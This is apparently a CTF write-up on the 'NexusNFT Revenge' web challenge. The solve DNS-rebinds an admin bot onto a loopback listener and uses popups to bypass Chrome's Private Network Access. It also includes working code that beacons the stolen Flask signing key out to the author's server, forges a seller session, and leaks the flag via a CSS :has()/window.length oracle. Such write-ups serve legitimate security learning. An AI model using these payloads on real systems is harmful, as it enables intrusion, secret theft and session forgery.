@@ -1,0 +1,311 @@
+---
+title: '07CTF 2026 - NexusNFT Revenge'
+description: 'DNS-rebinding an admin bot onto a loopback listener through a PNA-exempt popup to steal the signing key, forge a seller session, then re-run the window.length oracle'
+date: 2026-09-20
+tags: ['writeup', 'web', 'dns-rebinding', 'pna-bypass', 'xs-leaks', 'session-forgery', '07ctf', '2026']
+authors: ['kudaliar']
+draft: false
+---
+
+The revenge edition of [NexusNFT](/blog/07ctf-2026-nexusnft). One file changed — `app/main.py` — and both of the original's footholds became *functions of the flag*, so neither can be used to reach the flag. What is left is a three-stage chain:
+
+1. **DNS-rebind the admin bot's browser onto nginx's loopback-only `127.0.0.1:5001` listener** and read `app.secret_key` out of `/flag`. On the deployed instance the obvious `fetch()` version of this is dead — Chrome 153 blocks public → loopback (Private Network Access) — so the read goes through a **popup**, which is a top-level navigation and therefore PNA-exempt.
+2. **Forge a Flask session** with `is_seller: true` from that key, which re-opens `/create-product` and with it the stored HTML injection.
+3. **Run the original CSS `:has()` + `window.length` oracle** to read the bot's username — which *is* the flag — one character per bot visit.
+
+## Challenge Description
+
+> Well, forgot to change the secrets before deploying. So here is fortified version.
+
+## What the patch changed
+
+`diff` against the original handout touches eight lines:
+
+```diff
++import hashlib
++FLAG = os.environ["FLAG"]
+ app = Flask(__name__)
+-app.secret_key = 'REDACTED'
+-FLAG = os.environ.get("FLAG", "flag{not_set}")
++app.secret_key = hashlib.sha256(("nft-session:" + FLAG).encode()).hexdigest()
+
+ users = {
+     "admin": {
+-        "password": os.environ.get("ADMIN_PASSWORD", "report_to_admin_if_this_works"),
++        "password": FLAG,
+```
+
+Everything the original solution stood on is gone:
+
+- The admin password was the hard-coded default `report_to_admin_if_this_works`. Now `admin`'s password **is** the flag, so knowing it means already having won.
+- `app.secret_key` was a static `'REDACTED'`. Now it is `sha256("nft-session:" + FLAG)`.
+
+That second change is the tell. A hash of the flag is not a *leak* target, it is a *capability* target: whoever reads it can forge sessions, and nothing else. Everything else is byte-identical, including the part that matters:
+
+```python
+users = {
+    FLAG: {"password": FLAG, "name": FLAG, "role": "user", "is_seller": False, ...}
+}
+```
+
+```js
+const ADMIN_USERNAME = process.env.ADMIN_USERNAME || process.env.FLAG;
+const ADMIN_PASSWORD = process.env.ADMIN_PASSWORD || process.env.FLAG;
+```
+
+**The flag is a username, and the bot logs in as it.** `templates/base.html` then renders it into every page the bot loads:
+
+```html
+<span class="user-greeting" data-username="{{ session.username }}">{{ session.username }}</span>
+```
+
+The sink that sits next to it is `templates/product.html` — `{{ product.description | safe }}`, unescaped, on a page that extends `base.html`, and reachable without login. So the leak primitive is untouched. The problem is purely one of access: `/create-product` is behind `@seller_required`.
+
+### Why seller access is genuinely closed
+
+`session['is_seller']` is only ever set from the user table at login, and `is_seller: True` belongs to `admin` alone. The two routes that could grant it don't:
+
+```python
+@app.route('/upgrade-seller', methods=['POST'])
+@login_required
+def upgrade_seller():
+    flash('This is disabled temporarily!', 'info')
+    return redirect(url_for('dashboard'))     # <- returns before its own body
+    if session.get('is_seller'): ...
+```
+
+```python
+def dashboard():
+    ...
+    if session.get('is_seller', False):
+        users[session['username']]['is_seller'] = True   # <- gated on already being one
+```
+
+`/register` writes no `is_seller` key at all. So seller access needs either the admin password (= the flag) or the signing key. The signing key it is.
+
+## Where the key is served from
+
+```python
+@app.route('/flag')
+def internal_secret():
+    if request.headers.get('X-Internal-Listener') != '1':
+        return jsonify({'error': 'not found'}), 404
+    return jsonify({'secret_key': app.secret_key})
+```
+
+That header is not something a browser can be talked into sending — it is injected by nginx, and only on one of its three listeners:
+
+```nginx
+server {                      # public :80
+    location = /flag { return 404; }
+    location /bot/  { proxy_pass http://127.0.0.1:3000/; }
+    location /      { proxy_pass http://127.0.0.1:5002; }
+}
+server {                      # what the bot uses
+    listen 127.0.0.1:5000 ssl;
+    server_name nft-app;
+    location / { proxy_pass http://127.0.0.1:5002; }
+}
+server {                      # the target
+    listen 127.0.0.1:5001;
+    location = /flag {
+        proxy_pass http://127.0.0.1:5002;
+        proxy_set_header X-Internal-Listener 1;
+    }
+    location / { return 404; }
+}
+```
+
+Two dead ends first, so the shape of the real answer is forced:
+
+- **Path confusion on :80.** `location = /flag` is an exact match. About 70 variants — dot-segments, double and partial percent-encoding, null bytes, semicolon parameters, trailing whitespace and control characters — all returned 404 or reached `location /` as some other path. nginx normalises before matching, and Flask's router does not re-normalise afterwards.
+- **Cross-origin `fetch` with the header.** `X-Internal-Listener` is not a CORS-safelisted request header, so it forces a preflight — and nothing ever emits an `Access-Control-Allow-*` header, so the request never leaves the browser.
+
+The listener is on **its own port**, and the bot dwells **20 seconds** on external URLs (vs 3.5s for URLs on `APP_URL`). A separate port plus a long dwell is the classic DNS-rebinding setup.
+
+## Stage 1 — rebinding onto 127.0.0.1:5001
+
+The rig, in three beats:
+
+1. Submit `http://make-<PUB>-and-127.0.0.1-rr.1u.ms:5001/<token>` to the bot. `1u.ms` answers that name with **two A records, ours first**, both TTL 0:
+
+   ```text
+   make-173.212.235.82-and-127.0.0.1-rr.1u.ms.  0  IN  A  173.212.235.82
+   make-173.212.235.82-and-127.0.0.1-rr.1u.ms.  0  IN  A  127.0.0.1
+   ```
+
+   Chrome connects to the first address and loads our page. Origin: `http://make-…-rr.1u.ms:5001`.
+
+2. We **close** `:5001` immediately after serving it (`shutdown()` *and* `server_close()` — `shutdown()` alone leaves the listening socket up, so the next request hangs in the backlog instead of failing fast).
+
+3. Any later request to that origin cannot be re-resolved — Chrome caches the entry for ~60s regardless of TTL — but because **two addresses sit in one cache entry, it fails over to the second** without re-resolving. The request lands on `127.0.0.1:5001`, nginx adds `X-Internal-Listener: 1`, and the response is same-origin, so the page can read the body.
+
+The single-A-record variant does not work: the port must close *and* a second address must already be cached.
+
+### The wall: Private Network Access
+
+Locally this worked first try. On the deployed instance every single fetch died. A diagnostic page through the live bot:
+
+```text
+[ua]            HeadlessChrome/153.0.0.0
+[A_botheal_80]  ERR Failed to fetch      <- http://nft-app/bot/health, a known-good endpoint
+[B_127_5001]    ERR Failed to fetch
+[C_nftapp_5001] ERR Failed to fetch
+[D_pub_self]    OK                       <- public -> public is fine
+```
+
+`/bot/health` exists and resolves, and it still failed. Chrome 153 blocks **subresource** requests from a document in the *public* address space to *loopback*. The local/remote difference was never the code:
+
+| | document served from | fetch to 127.0.0.1 |
+|---|---|---|
+| local rig | `172.17.0.6` — **private** | works |
+| VPS | `173.212.235.82` — **public** | blocked |
+
+Chrome still permits private → loopback, which is exactly why the Docker-bridge rehearsal succeeded and the real run could not. Two attempts to get the document itself into local address space also failed: an `rbndr.us` alternating single-A rig (Chrome pins a hostname's resolution for the page's lifetime, so document and scripts always share one answer), and rebinding port 80 (pointless — the bot's cookies are host-scoped to `nft-app`, so a rebound origin loses the session that makes the flag appear).
+
+### The bypass: popups
+
+Private Network Access covers subresource fetches and nested document loads. A **top-level navigation is out of scope**, and `window.open()` is a top-level navigation. It also side-steps `X-Frame-Options: DENY`, which applies to framing, not popups. And `Cross-Origin-Opener-Policy: same-origin` — set on every Flask response — is only honoured in a *secure context*; the rebound origin is plain `http://` on a hostname, so it is ignored and the opener keeps its handle.
+
+So instead of fetching `/flag`, open it:
+
+```js
+var w = null, n = 0;
+function poll(){
+  n++;
+  if (!w || w.closed) w = window.open("/flag?" + Math.random(), "p");
+  try {
+    var t = w && w.document && w.document.body ? w.document.body.innerText : "";
+    if (t.indexOf("secret" + "_key") >= 0) { out("KEY", t); return; }     // beacon it out
+    if (n % 6 === 0 && w) w.location = "/flag?" + Math.random();          // retry in place
+  } catch (e) { /* not there yet */ }
+  if (n < 80) setTimeout(poll, 250);
+}
+setTimeout(poll, 1500);
+```
+
+The popup is same-origin (identical scheme/host/port *strings*), so `w.document` is readable. `remote.py` serves that page on `:5001`, closes the port, and collects the beacon on `:5002`:
+
+```text
+[*] served exploit page to 34.75.117.88 ua=... HeadlessChrome/153
+[exfil] boot: http://make-173.212.235.82-and-127.0.0.1-rr.1u.ms:5001/9b9395a1fe3d
+[*] :5001 closed -- next fetch fails over to 127.0.0.1
+[exfil] KEY: {"secret_key":"735444eaf78f0623aabc8f65a944aa13f38884da7b612eeee3ff26018ee86bb4"}
+```
+
+Sanity check on the shape: the key is `sha256("nft-session:" + FLAG)`, and 64 hex chars is what came back. Because it is derived from the flag, it survives every redeploy of the instance — which matters later.
+
+## Stage 2 — forging the seller session
+
+Flask's cookie is `itsdangerous` with a fixed recipe:
+
+```python
+from itsdangerous import URLSafeTimedSerializer
+from flask.sessions import TaggedJSONSerializer
+
+s = URLSafeTimedSerializer(
+    "735444eaf78f0623aabc8f65a944aa13f38884da7b612eeee3ff26018ee86bb4",
+    salt='cookie-session',
+    serializer=TaggedJSONSerializer(),
+    signer_kwargs={'key_derivation': 'hmac', 'digest_method': hashlib.sha1})
+
+s.dumps({"username": "sellerbot", "is_seller": True})
+# eyJ1c2VybmFtZSI6InNlbGxlcmJvdCIsImlzX3NlbGxlciI6dHJ1ZX0.aq8SLA.uyYlpNcp01kMfH9e_Ia8Uj2myjg
+```
+
+One prerequisite: `/dashboard` does `users.get(session['username'])` and 404s on a miss, so `sellerbot` must actually exist — a plain `POST /register` handles that. And a forged cookie is static, so the server's `Set-Cookie` never comes back and the `/product/<id>` flash is lost with it; take the new product id by diffing `/dashboard` before and after the create instead.
+
+## Stage 3 — the window.length oracle
+
+This part is inherited unchanged from the original challenge. The page the bot loads has the flag in an attribute, and CSS attribute selectors are the one thing that can match on it:
+
+```css
+body:has([data-username^="07CTF{u"]) .g0 { display: inline-block }
+```
+
+`:has()` promotes that match to the whole document, so a rule anywhere can react to it. To turn one bit into something observable, gate `<object>` elements on it:
+
+```html
+<style>object{display:none} …rules…</style>
+<object class="g0" data="/bot/health" width=1 height=1></object>   <!-- x127 -->
+```
+
+A `display:none` `<object>` never creates a nested browsing context; a rendered one does, and every browsing context increments `window.length` — **which is readable cross-origin**. Two details decide whether this works at all:
+
+- **`/bot/health`, not a Flask path.** Every Flask response carries `X-Frame-Options: DENY`, so an `<object>` pointed at one creates no frame. `/bot/` is proxied straight to Express, which sets no XFO — and its `{"status":"healthy"}` renders as a document.
+- **CSP `default-src 'self'`** covers `object-src` by fallback, so same-origin objects are allowed. No JavaScript is needed on the target origin at any point.
+
+Encode the character index in binary — 7 bits covers the 82-character charset — with `2^j` objects in class `.gj`, so one visit yields a whole character:
+
+```python
+for i, ch in enumerate(CHARSET):
+    for j in range(NBITS):
+        if (i + 1) >> j & 1:
+            rules.append('body:has([data-username^="%s%s"]) .g%d{display:inline-block}'
+                         % (known, ch, j))
+objs = "".join('<object class="g%d" data="/bot/health" width=1 height=1></object>' % j
+               for j in range(NBITS) for _ in range(1 << j))
+```
+
+`i + 1` rather than `i` so that "no match" (0) stays distinguishable from the first character of the charset. The reader is the same popup trick as stage 1, now used purely as a counter:
+
+```js
+var w = window.open('http://nft-app/product/' + pid, 'leak');
+setTimeout(function(){
+  var n = -1;
+  try { n = w.length; } catch (e) {}
+  w.close();
+  new Image().src = '/report?n=' + n;
+}, 5000);
+```
+
+The popup inherits the bot's cookies (host-scoped to `nft-app`, and the session cookie is not `Secure`, so the `https://nft-app:5000` login carries over to `http://nft-app`), which is what makes `data-username` the flag rather than our own username. 5s to read, inside the 20s external dwell.
+
+Each accepted character is proved by the round *after* it: every selector in round *k+1* carries the full known prefix, so if any earlier character were wrong nothing matches, all 127 objects stay `display:none`, and `window.length` comes back **0** — the oracle retries rather than advancing. A chain that keeps advancing is a chain that has been correct at every step.
+
+## Running it
+
+`oracle.py` on the VPS does the whole of stages 2–3, and — since instances expire — keeps itself alive against the platform API. Redeploying is safe precisely because the signing key is a function of the flag: the forged cookie stays valid across instances, and only `sellerbot` has to be re-registered.
+
+```text
+$ COOKIE=… CTFSESS=… PUB=173.212.235.82 PORT=5002 python3 oracle.py
+[+] http://c958a2c36a.ctf.bg2.in -- leaking from '07CTF{'
+    07CTF{u
+    07CTF{un
+    07CTF{unc
+    07CTF{unch
+    07CTF{unchA
+    07CTF{unchAn
+    07CTF{unchAn9
+    07CTF{unchAn93
+   (visit 1 lost in the bot login race)
+    07CTF{unchAn93D
+    07CTF{unchAn93DD
+    07CTF{unchAn93DDD
+    07CTF{unchAn93DDDZ
+    07CTF{unchAn93DDDZ}
+
+[+] FLAG: 07CTF{unchAn93DDDZ}
+```
+
+13 characters, one bot visit each, plus one visit lost to the bot's login step and retried — 14 in total.
+
+## Verification
+
+The app stores `users[FLAG] = {"password": FLAG, "name": FLAG}`, which gives an independent check that doesn't involve the oracle at all — log in as the flag:
+
+```text
+$ curl -s -c jar.txt -o /dev/null -w '%{http_code} %{redirect_url}\n' -X POST $B/login \
+       --data-urlencode 'username=07CTF{unchAn93DDDZ}' \
+       --data-urlencode 'password=07CTF{unchAn93DDDZ}'
+302 http://c958a2c36a.ctf.bg2.in/dashboard
+
+$ curl -s -b jar.txt -L $B/dashboard | grep -o 'data-username="[^"]*"'
+data-username="07CTF{unchAn93DDDZ}"
+```
+
+## Flag
+
+```text
+07CTF{unchAn93DDDZ}
+```
